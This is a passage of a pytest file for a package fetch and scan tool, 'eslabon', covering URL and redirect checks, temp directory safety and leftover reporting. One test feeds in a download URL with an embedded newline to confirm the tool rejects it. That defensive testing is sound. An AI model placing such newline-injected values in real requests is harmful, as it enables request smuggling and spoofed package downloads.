    with pytest.raises(FetchError):
        fetch._check_url(url)
    h = fetch._SafeRedirect()
    req = urlreq.Request("https://pypi.org/a")
    with pytest.raises(FetchError):
        h.redirect_request(req, None, 302, "Found", {}, url)


def test_dist_url_with_newline_rejected_before_download():
    entry = dict(SDIST_E, url="https://files.python" + chr(10) + "hosted.org/p.tar.gz")
    reg = Registry({"https://pypi.org/pypi/pkg/1.0/json": _pypi_doc(entry)})
    with pytest.raises(FetchError):
        fetch.resolve("pkg", "1.0", "pypi", opener=reg)
    assert len(reg.requests) == 1


def test_temp_dir_inside_working_tree_fails_closed(out, monkeypatch, track):
    inside = out.parent.parent / "tmp-inside"
    inside.mkdir()
    monkeypatch.setattr(tempfile, "tempdir", str(inside))
    reg = _pypi_registry()
    monkeypatch.setattr(fetch, "DEFAULT_OPENER", reg)
    assert _main("requests==2.32.3", out, "--ecosystem", "pypi", "--offline") == 2
    s = _summary(out)
    assert s["eslabon"]["scan"]["status"] == "fetch_error"
    assert s["eslabon"]["scan"]["error"] == "temp dir inside working tree"
    assert reg.requests == []  # nothing fetched, nothing written
    assert os.listdir(inside) == []  # and the dir it made is gone
    assert track["files"] == []


def test_protected_temp_locations(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    assert cli._temp_dir_unsafe(tmp_path / "eslabon-x")
    assert cli._temp_dir_unsafe(REPO / "eslabon-x")
    assert cli._temp_dir_unsafe(REPO / "src" / "eslabon" / "eslabon-x")
    elsewhere = Path(tempfile.gettempdir()) / "eslabon-x"
    if tmp_path.resolve() not in elsewhere.resolve().parents:
        assert not cli._temp_dir_unsafe(elsewhere)


def test_temp_leftover_reported(out, monkeypatch, track, capsys):
    monkeypatch.setattr(cli.shutil, "rmtree", lambda *a, **k: None)
    monkeypatch.setattr(fetch, "DEFAULT_OPENER", _pypi_registry())
    try:
        code = _main("requests==2.32.3", out, "--ecosystem", "pypi", "--offline")
        tmp = track["dirs"][0]
        assert tmp.exists()
        assert code == 0  # temp_leftover is not "incomplete"
        sc = _summary(out)["eslabon"]["scan"]
        assert sc["status"] == "ok"
        assert sc["anomaly_kinds"] == ["temp_leftover"]
        err = capsys.readouterr().err
        assert err.count(chr(10)) == 1 and tmp.name in err
    finally:
        for d in track["dirs"]:
            for f in d.iterdir():
                f.unlink()
            d.rmdir()
